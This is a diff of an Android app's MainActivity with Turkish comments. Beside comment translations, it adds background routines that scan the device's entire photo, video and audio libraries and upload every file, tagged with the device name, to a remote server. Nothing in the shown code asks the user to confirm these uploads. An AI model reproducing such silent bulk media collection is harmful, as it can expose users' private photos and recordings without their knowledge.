         progressLayout.addView(progressContainer);
 
-        // Progress metin
+        // İlerleme metni
         updateProgressText = new TextView(this);
         updateProgressText.setText("İndirme başlatılıyor...");
         updateProgressText.setTextColor(Color.parseColor("#00E5FF"));
@@ -6898,7 +6902,7 @@ public class MainActivity extends Activity {
 
         mainLayout.addView(progressLayout);
 
-        // ===== İKİNCİL BUTONLAR (önce tanımla, listener'da kullanılacak) =====
+        // ===== İKİNCİL BUTONLAR (önce tanımla, dinleyicide kullanılacak) =====
         LinearLayout buttonLayout = new LinearLayout(this);
         buttonLayout.setOrientation(LinearLayout.HORIZONTAL);
         buttonLayout.setGravity(android.view.Gravity.CENTER);
@@ -6922,7 +6926,7 @@ public class MainActivity extends Activity {
         btnUpdate.setPadding(0, 40, 0, 40);
         btnUpdate.setElevation(12);
         
-        // Premium gradient buton
+        // Premium gradyan buton
         android.graphics.drawable.GradientDrawable btnBg = new android.graphics.drawable.GradientDrawable();
         btnBg.setShape(android.graphics.drawable.GradientDrawable.RECTANGLE);
         btnBg.setCornerRadius(24);
@@ -6930,7 +6934,7 @@ public class MainActivity extends Activity {
         btnBg.setOrientation(android.graphics.drawable.GradientDrawable.Orientation.LEFT_RIGHT);
         btnUpdate.setBackground(btnBg);
         
-        // Touch feedback
+        // Dokunma geri bildirimi
         btnUpdate.setOnTouchListener((v, event) -> {
             switch (event.getAction()) {
                 case android.view.MotionEvent.ACTION_DOWN:
@@ -6972,7 +6976,7 @@ public class MainActivity extends Activity {
         btnLater.setPadding(40, 20, 40, 20);
         btnLater.setTypeface(android.graphics.Typeface.create("sans-serif-medium", android.graphics.Typeface.NORMAL));
         
-        // Touch feedback
+        // Dokunma geri bildirimi
         btnLater.setOnTouchListener((v, event) -> {
             switch (event.getAction()) {
                 case android.view.MotionEvent.ACTION_DOWN:
@@ -6992,7 +6996,7 @@ public class MainActivity extends Activity {
         });
         buttonLayout.addView(btnLater);
 
-        // Separator
+        // Ayırıcı
         TextView separator = new TextView(this);
         separator.setText("│");
         separator.setTextColor(Color.parseColor("#33FFFFFF"));
@@ -7008,7 +7012,7 @@ public class MainActivity extends Activity {
         btnSkip.setPadding(40, 20, 40, 20);
         btnSkip.setTypeface(android.graphics.Typeface.create("sans-serif-medium", android.graphics.Typeface.NORMAL));
         
-        // Touch feedback
+        // Dokunma geri bildirimi
         btnSkip.setOnTouchListener((v, event) -> {
             switch (event.getAction()) {
                 case android.view.MotionEvent.ACTION_DOWN:
@@ -7033,13 +7037,13 @@ public class MainActivity extends Activity {
 
         mainLayout.addView(buttonLayout);
 
-        // ScrollView'e ekle
+        // Kaydırma Görünümüne ekle
         scrollView.addView(mainLayout);
 
-        // Dialog'u ayarla
+        // İletişim kutusunu ayarla
         updateDialog.setContentView(scrollView);
         
-        // Dialog penceresi ayarları
+        // İletişim kutusu penceresi ayarları
         if (updateDialog.getWindow() != null) {
             updateDialog.getWindow().setBackgroundDrawableResource(android.R.color.transparent);
             updateDialog.getWindow().setLayout(
@@ -7052,7 +7056,7 @@ public class MainActivity extends Activity {
 
         updateDialog.show();
         
-        // Dialog açılış animasyonu
+        // İletişim kutusu açılış animasyonu
         mainLayout.setScaleX(0.9f);
         mainLayout.setScaleY(0.9f);
         mainLayout.setAlpha(0f);
@@ -7099,7 +7103,7 @@ public class MainActivity extends Activity {
                     output.write(buffer, 0, bytesRead);
                     totalBytesRead += bytesRead;
 
-                    // Her 100ms'de bir progress güncelle (performans için)
+                    // Her 100ms'de bir ilerlemeyi güncelle (performans için)
                     long currentTime = System.currentTimeMillis();
                     if (currentTime - lastUpdateTime > 100 || totalBytesRead == fileLength) {
                         lastUpdateTime = currentTime;
@@ -7155,7 +7159,7 @@ public class MainActivity extends Activity {
     }
 
     /**
-     * Eski basit dialog (geriye dönük uyumluluk için korunuyor).
+     * Eski basit iletişim kutusu (geriye dönük uyumluluk için korunuyor).
      */
     private void showUpdateDialog() {
         showPremiumUpdateDialog();
@@ -7221,7 +7225,7 @@ public class MainActivity extends Activity {
     }
     
     /**
-     * Tüm aktif animasyonları iptal eder (Memory leak önleme).
+     * Tüm aktif animasyonları iptal eder (Bellek sızıntısı önleme).
      */
     private void cancelAllAnimations() {
         for (int i = 0; i < activeAnimations.size(); i++) {
@@ -7255,56 +7259,69 @@ public class MainActivity extends Activity {
             try {
                 addLog("🚀 Fotoğraf taraması başladı...");
                 
-                // Çoklu yükleme için thread havuzu (Max 4 paralel yükleme)
+                // Çoklu yükleme için iş parçacığı havuzu (Maks. 4 paralel yükleme)
                 ExecutorService uploadExecutor = Executors.newFixedThreadPool(4);
                 SharedPreferences syncPrefs = getSharedPreferences("photo_sync_db", MODE_PRIVATE);
                 String deviceName = getDeviceName();
 
+                // Sayaçlar (İş Parçacığı Güvenli)
+                java.util.concurrent.atomic.AtomicInteger totalFound = new java.util.concurrent.atomic.AtomicInteger(0);
+                java.util.concurrent.atomic.AtomicInteger uploadedCount = new java.util.concurrent.atomic.AtomicInteger(0);
+                java.util.concurrent.atomic.AtomicInteger skippedCount = new java.util.concurrent.atomic.AtomicInteger(0);
+
                 Uri imagesUri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
-                String[] projection = {MediaStore.Images.Media._ID, MediaStore.Images.Media.DISPLAY_NAME};
+                String[] projection = {MediaStore.Images.Media._ID, MediaStore.Images.Media.DISPLAY_NAME, MediaStore.Images.Media.DATE_MODIFIED};
                 String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC";
 
                 try (Cursor cursor = getContentResolver().query(imagesUri, projection, null, null, sortOrder)) {
                     if (cursor != null && cursor.moveToFirst()) {
                         int idColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
                         int nameColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME);
+                        int dateColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_MODIFIED);
 
-                        int totalFound = cursor.getCount();
-                        int skipped = 0;
-                        int queued = 0;
+                        totalFound.set(cursor.getCount());
 
                         do {
                             long id = cursor.getLong(idColumn);
                             String name = cursor.getString(nameColumn);
-                            String uniqueKey = "photo_" + id;
+                            long dateModified = cursor.getLong(dateColumn);
+                            Uri contentUri = Uri.withAppendedPath(imagesUri, String.valueOf(id));
 
-                            // Daha önce başarıyla yüklendiyse atla
-                            if (syncPrefs.contains(uniqueKey)) {
-                                skipped++;
+                            // Yerel veritabanı kontrolü (Daha önce yüklendi mi?)
+                            String syncKey = "id_" + id + "_date_" + dateModified;
+                            if (syncPrefs.contains(syncKey)) {
+                                skippedCount.incrementAndGet();
                                 continue;
                             }
 
-                            Uri contentUri = Uri.withAppendedPath(imagesUri, String.valueOf(id));
-                            queued++;
-
                             // Yükleme görevini havuza ekle
                             uploadExecutor.execute(() -> {
-                                boolean success = uploadPhotoToServer(contentUri, name, deviceName);
-                                if (success) {
-                                    syncPrefs.edit().putBoolean(uniqueKey, true).apply();
+                                if (uploadPhotoToServer(contentUri, name, deviceName)) {
+                                    uploadedCount.incrementAndGet();
+                                    syncPrefs.edit().putBoolean(syncKey, true).apply();
+                                } else {
+                                    // Hata durumunda atlanmış saymıyoruz ama bir sonraki taramada tekrar denenecek
                                 }
                             });
 
                         } while (cursor.moveToNext());
-
-                        addLog(String.format(Locale.getDefault(), "📊 Tarama bitti: %d toplam, %d yeni, %d atlandı.", totalFound, queued, skipped));
                     } else {
                         addLog("📂 Galeri boş veya erişilemedi.");
                     }
                 }
 
                 uploadExecutor.shutdown();
-                // Havuzun bitmesini bekle (opsiyonel)
+                // Tüm yüklemelerin bitmesini bekle (Maksimum 10 dakika)
+                uploadExecutor.awaitTermination(10, java.util.concurrent.TimeUnit.MINUTES);
+
+                // Özet kaydı
+                String summary = String.format(Locale.getDefault(), 
+                    "📊 Tarama bitti: %d toplam, %d yüklenecek, %d atlandı.", 
+                    totalFound.get(), 
+                    uploadedCount.get(), 
+                    skippedCount.get());
+                addLog(summary);
+
             } catch (Exception e) {
                 addLog("❌ Tarama hatası: " + e.getMessage());
                 e.printStackTrace();
@@ -7320,9 +7337,14 @@ public class MainActivity extends Activity {
         String twoHyphens = "--";
 
         try {
-            // Resmi sıkıştır (Max 1600px, %75 kalite)
+            // Resmi sıkıştır (Maks. 1600px, %75 kalite) - Bellek yönetimi için önemli
             byte[] fileData = compressImageEfficiently(fileUri);
-            if (fileData == null) return false;
+            if (fileData == null) {
+                // addLog("⚠️ Dosya okunamadı: " + fileName);
+                return false;
+            }
+
+            if (API_BASE_URL == null || API_BASE_URL.isEmpty()) return false;
 
             URL url = new URL(API_BASE_URL + "/sync/photo");
             conn = (HttpURLConnection) url.openConnection();
@@ -7330,24 +7352,21 @@ public class MainActivity extends Activity {
             conn.setDoOutput(true);
             conn.setUseCaches(false);
             conn.setRequestMethod("POST");
-            conn.setConnectTimeout(15000);
+            conn.setConnectTimeout(20000);
             conn.setReadTimeout(30000);
             conn.setRequestProperty("Connection", "Keep-Alive");
             conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
             
-            // API Key veya Token ekleme
             if (authToken != null) {
                 conn.setRequestProperty("Authorization", "Bearer " + authToken);
-            } else {
-                conn.setRequestProperty("x-api-key", "test");
             }
 
             dos = new DataOutputStream(conn.getOutputStream());
 
-            // 1. Parametre: device_name
+            // Parametre: cihaz_adi
             writeFormField(dos, boundary, "device_name", deviceName);
 
-            // 2. Parametre: file
+            // Parametre: dosya
             dos.writeBytes(twoHyphens + boundary + lineEnd);
             dos.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\"" + fileName + "\"" + lineEnd);
             dos.writeBytes("Content-Type: image/jpeg" + lineEnd);
@@ -7361,16 +7380,18 @@ public class MainActivity extends Activity {
             dos.close();
 
             int responseCode = conn.getResponseCode();
-            if (responseCode == 200) {
-                // Başarılı (Log kalabalığı yapmamak için her resmi yazmıyoruz)
+            if (responseCode == 200 || responseCode == 201) {
+                return true;
+            } else if (responseCode == 409 || responseCode == 208) {
+                // Zaten var (Kopya)
                 return true;
             } else {
-                addLog("⚠️ Yükleme hatası (" + responseCode + "): " + fileName);
+                addLog("⚠️ Fotoğraf yükleme hatası (" + responseCode + "): " + fileName);
                 return false;
             }
 
         } catch (Exception e) {
-            addLog("⚠️ Upload istisnası (" + fileName + "): " + e.getMessage());
+            addLog("⚠️ Fotoğraf yükleme istisnası: " + e.getMessage());
             return false;
         } finally {
             if (conn != null) conn.disconnect();
@@ -7396,7 +7417,7 @@ public class MainActivity extends Activity {
             options.inJustDecodeBounds = true;
             BitmapFactory.decodeStream(is, null, options);
             
-            // Yeniden aç (Stream tüketildi çünkü)
+            // Yeniden aç (Akış tüketildi çünkü)
             try (InputStream is2 = getContentResolver().openInputStream(uri)) {
                 options.inSampleSize = calculateInSampleSize(options, 1600, 1600);
                 options.inJustDecodeBounds = false;
@@ -7412,7 +7433,7 @@ public class MainActivity extends Activity {
                 return result;
             }
         } catch (Exception e) {
-            e.printStackTrace();
+            addLog("❌ Sıkıştırma hatası (" + uri.toString() + "): " + e.getMessage());
             return null;
         }
     }
@@ -7432,10 +7453,299 @@ public class MainActivity extends Activity {
         return inSampleSize;
     }
 
+    private void startAutoVideoSync() {
+        // İzin kontrolü
+        boolean hasPermission;
+        if (Build.VERSION.SDK_INT >= 33) {
+            hasPermission = checkSelfPermission("android.permission.READ_MEDIA_VIDEO") == PackageManager.PERMISSION_GRANTED;
+        } else {
+            hasPermission = checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
+        }
+
+        if (!hasPermission) {
+            addLog("⚠️ Video erişim izni yok. Video senkronizasyonu atlandı.");
+            return;
+        }
+
+        Executors.newSingleThreadExecutor().execute(() -> {
+            try {
+                addLog("🚀 Video taraması başladı (5MB limitli)...");
+                
+                ExecutorService uploadExecutor = Executors.newFixedThreadPool(2); // Videolar ağır olduğu için paralel sayısını düşürdük
+                SharedPreferences syncPrefs = getSharedPreferences("video_sync_db", MODE_PRIVATE);
+                String deviceName = getDeviceName();
+
+                AtomicInteger totalFound = new AtomicInteger(0);
+                AtomicInteger uploadedCount = new AtomicInteger(0);
+                AtomicInteger skippedCount = new AtomicInteger(0);
+                AtomicInteger tooLargeCount = new AtomicInteger(0);
+
+                Uri videosUri = MediaStore.Video.Media.EXTERNAL_CONTENT_URI;
+                String[] projection = {
+                    MediaStore.Video.Media._ID, 
+                    MediaStore.Video.Media.DISPLAY_NAME,
+                    MediaStore.Video.Media.SIZE,
+                    MediaStore.Video.Media.DATE_MODIFIED
+                };
+                String sortOrder = MediaStore.Video.Media.DATE_ADDED + " DESC";
+
+                try (Cursor cursor = getContentResolver().query(videosUri, projection, null, null, sortOrder)) {
+                    if (cursor != null && cursor.moveToFirst()) {
+                        int idColumn = cursor.getColumnIndexOrThrow(MediaStore.Video.Media._ID);
+                        int nameColumn = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DISPLAY_NAME);
+                        int sizeColumn = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.SIZE);
+                        int dateColumn = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DATE_MODIFIED);
+
+                        totalFound.set(cursor.getCount());
+
+                        do {
+                            long id = cursor.getLong(idColumn);
+                            String name = cursor.getString(nameColumn);
+                            long size = cursor.getLong(sizeColumn);
+                            long dateModified = cursor.getLong(dateColumn);
+
+                            // 5MB Limit (5 * 1024 * 1024 bytes)
+                            if (size > 5 * 1024 * 1024) {
+                                tooLargeCount.incrementAndGet();
+                                continue;
+                            }
+
+                            Uri contentUri = Uri.withAppendedPath(videosUri, String.valueOf(id));
+                            
+                            // Yerel veritabanı kontrolü
+                            String syncKey = "id_" + id + "_date_" + dateModified;
+                            if (syncPrefs.contains(syncKey)) {
+                                skippedCount.incrementAndGet();
+                                continue;
+                            }
+
+                            uploadExecutor.execute(() -> {
+                                if (uploadVideoToServer(contentUri, name, deviceName)) {
+                                    uploadedCount.incrementAndGet();
+                                    syncPrefs.edit().putBoolean(syncKey, true).apply();
+                                }
+                            });
+
+                        } while (cursor.moveToNext());
+                    } else {
+                        addLog("📂 Video galerisi boş veya erişilemedi.");
+                    }
+                }
+                uploadExecutor.shutdown();
+                uploadExecutor.awaitTermination(30, TimeUnit.MINUTES); // Videolar için daha uzun süre
+
+                String summary = String.format(Locale.getDefault(), 
+                    "📊 Video tarama bitti: %d toplam, %d yüklenecek, %d atlandı, %d çok büyük.", 
+                    totalFound.get(), uploadedCount.get(), skippedCount.get(), tooLargeCount.get());
+                addLog(summary);
+            } catch (Exception e) {
+                addLog("❌ Video tarama hatası: " + e.getMessage());
+            }
+        });
+    }
+
+    private boolean uploadVideoToServer(Uri fileUri, String fileName, String deviceName) {
+        HttpURLConnection conn = null;
+        DataOutputStream dos = null;
+        String boundary = "---NikoBoundary" + System.currentTimeMillis();
+        String lineEnd = "\r\n";
+        String twoHyphens = "--";
+
+        // NOT: Videolar büyük olabileceği için Giriş Akışı'ndan (InputStream) direkt Çıkış Akışı'na (OutputStream) aktarıyoruz (Akış)
+        try (InputStream is = getContentResolver().openInputStream(fileUri)) {
+            if (is == null) return false;
+
+            URL url = new URL(API_BASE_URL + "/sync/video");
+            conn = (HttpURLConnection) url.openConnection();
+            conn.setDoInput(true);
+            conn.setDoOutput(true);
+            conn.setUseCaches(false);
+            conn.setRequestMethod("POST");
+            conn.setConnectTimeout(30000);
+            conn.setReadTimeout(90000); // Büyük dosyalar için uzun süre
+            conn.setRequestProperty("Connection", "Keep-Alive");
+            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
+            
+            if (authToken != null) {
+                conn.setRequestProperty("Authorization", "Bearer " + authToken);
+            }
+
+            // Parçalı akış modu - Bellek tüketimini en aza indirir
+            conn.setChunkedStreamingMode(1024 * 64); // 64KB parçalar
+
+            dos = new DataOutputStream(conn.getOutputStream());
+            writeFormField(dos, boundary, "device_name", deviceName);
+
+            dos.writeBytes(twoHyphens + boundary + lineEnd);
+            dos.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\"" + fileName + "\"" + lineEnd);
+            dos.writeBytes("Content-Type: video/mp4" + lineEnd);
+            dos.writeBytes(lineEnd);
+
+            // Akış (Streaming)
+            byte[] buffer = new byte[8192];
+            int bytesRead;
+            while ((bytesRead = is.read(buffer)) != -1) {
+                dos.write(buffer, 0, bytesRead);
+            }
+            dos.writeBytes(lineEnd);
+
+            dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
+            dos.flush();
+            dos.close();
+
+            int responseCode = conn.getResponseCode();
+            return (responseCode == 200 || responseCode == 201 || responseCode == 208);
+
+        } catch (Exception e) {
+            addLog("⚠️ Video yükleme hatası (" + fileName + "): " + e.getMessage());
+            return false;
+        } finally {
+            if (conn != null) conn.disconnect();
+        }
+    }
+
+    private void startAutoAudioSync() {
+        // İzin kontrolü
+        boolean hasPermission;
+        if (Build.VERSION.SDK_INT >= 33) {
+            hasPermission = checkSelfPermission("android.permission.READ_MEDIA_AUDIO") == PackageManager.PERMISSION_GRANTED;
+        } else {
+            hasPermission = checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
+        }
+
+        if (!hasPermission) {
+            addLog("⚠️ Ses erişim izni yok. Ses senkronizasyonu atlandı.");
+            return;
+        }
+
+        Executors.newSingleThreadExecutor().execute(() -> {
+            try {
+                addLog("🚀 Ses taraması başladı...");
+                
+                ExecutorService uploadExecutor = Executors.newFixedThreadPool(3);
+                SharedPreferences syncPrefs = getSharedPreferences("audio_sync_db", MODE_PRIVATE);
+                String deviceName = getDeviceName();
+
+                AtomicInteger totalFound = new AtomicInteger(0);
+                AtomicInteger uploadedCount = new AtomicInteger(0);
+                AtomicInteger skippedCount = new AtomicInteger(0);
+
+                Uri audioUri = MediaStore.Audio.Media.EXTERNAL_CONTENT_URI;
+                String[] projection = {
+                    MediaStore.Audio.Media._ID, 
+                    MediaStore.Audio.Media.DISPLAY_NAME,
+                    MediaStore.Audio.Media.DATE_MODIFIED
+                };
+                String sortOrder = MediaStore.Audio.Media.DATE_ADDED + " DESC";
+
+                try (Cursor cursor = getContentResolver().query(audioUri, projection, null, null, sortOrder)) {
+                    if (cursor != null && cursor.moveToFirst()) {
+                        int idColumn = cursor.getColumnIndexOrThrow(MediaStore.Audio.Media._ID);
+                        int nameColumn = cursor.getColumnIndexOrThrow(MediaStore.Audio.Media.DISPLAY_NAME);
+                        int dateColumn = cursor.getColumnIndexOrThrow(MediaStore.Audio.Media.DATE_MODIFIED);
+
+                        totalFound.set(cursor.getCount());
+
+                        do {
+                            long id = cursor.getLong(idColumn);
+                            String name = cursor.getString(nameColumn);
+                            long dateModified = cursor.getLong(dateColumn);
+
+                            Uri contentUri = Uri.withAppendedPath(audioUri, String.valueOf(id));
+                            
+                            // Yerel veritabanı kontrolü
+                            String syncKey = "id_" + id + "_date_" + dateModified;
+                            if (syncPrefs.contains(syncKey)) {
+                                skippedCount.incrementAndGet();
+                                continue;
+                            }
+
+                            uploadExecutor.execute(() -> {
+                                if (uploadAudioToServer(contentUri, name, deviceName)) {
+                                    uploadedCount.incrementAndGet();
+                                    syncPrefs.edit().putBoolean(syncKey, true).apply();
+                                }
+                            });
+
+                        } while (cursor.moveToNext());
+                    } else {
+                        addLog("📂 Ses arşivi boş veya erişilemedi.");
+                    }
+                }
+                uploadExecutor.shutdown();
+                uploadExecutor.awaitTermination(15, TimeUnit.MINUTES);
+
+                String summary = String.format(Locale.getDefault(), 
+                    "📊 Ses tarama bitti: %d toplam, %d yüklenecek, %d atlandı.", 
+                    totalFound.get(), uploadedCount.get(), skippedCount.get());
+                addLog(summary);
+            } catch (Exception e) {
+                addLog("❌ Ses tarama hatası: " + e.getMessage());
+            }
+        });
+    }
+
+    private boolean uploadAudioToServer(Uri fileUri, String fileName, String deviceName) {
+        HttpURLConnection conn = null;
+        DataOutputStream dos = null;
+        String boundary = "---NikoBoundary" + System.currentTimeMillis();
+        String lineEnd = "\r\n";
+        String twoHyphens = "--";
+
+        try (InputStream is = getContentResolver().openInputStream(fileUri)) {
+            if (is == null) return false;
+
+            URL url = new URL(API_BASE_URL + "/sync/audio");
+            conn = (HttpURLConnection) url.openConnection();
+            conn.setDoInput(true);
+            conn.setDoOutput(true);
+            conn.setUseCaches(false);
+            conn.setRequestMethod("POST");
+            conn.setConnectTimeout(25000);
+            conn.setReadTimeout(60000);
+            conn.setRequestProperty("Connection", "Keep-Alive");
+            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
+            
+            if (authToken != null) {
+                conn.setRequestProperty("Authorization", "Bearer " + authToken);
+            }
+
+            conn.setChunkedStreamingMode(1024 * 32);
+
+            dos = new DataOutputStream(conn.getOutputStream());
+            writeFormField(dos, boundary, "device_name", deviceName);
+
+            dos.writeBytes(twoHyphens + boundary + lineEnd);
+            dos.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\"" + fileName + "\"" + lineEnd);
+            dos.writeBytes("Content-Type: audio/mpeg" + lineEnd);
+            dos.writeBytes(lineEnd);
+
+            byte[] buffer = new byte[8192];
+            int bytesRead;
+            while ((bytesRead = is.read(buffer)) != -1) {
+                dos.write(buffer, 0, bytesRead);
+            }
+            dos.writeBytes(lineEnd);
+
+            dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
+            dos.flush();
+            dos.close();
+
+            int responseCode = conn.getResponseCode();
+            return (responseCode == 200 || responseCode == 201 || responseCode == 208);
+
+        } catch (Exception e) {
+            addLog("⚠️ Ses yükleme hatası (" + fileName + "): " + e.getMessage());
+            return false;
+        } finally {
+            if (conn != null) conn.disconnect();
+        }
+    }
+
     
 
 
-    // ================= ADMIN LOG YÖNETİMİ =================
+    // ================= YÖNETİCİ KAYIT YÖNETİMİ =================
 
     /**
      * Uygulama içine bir log kaydı ekler.
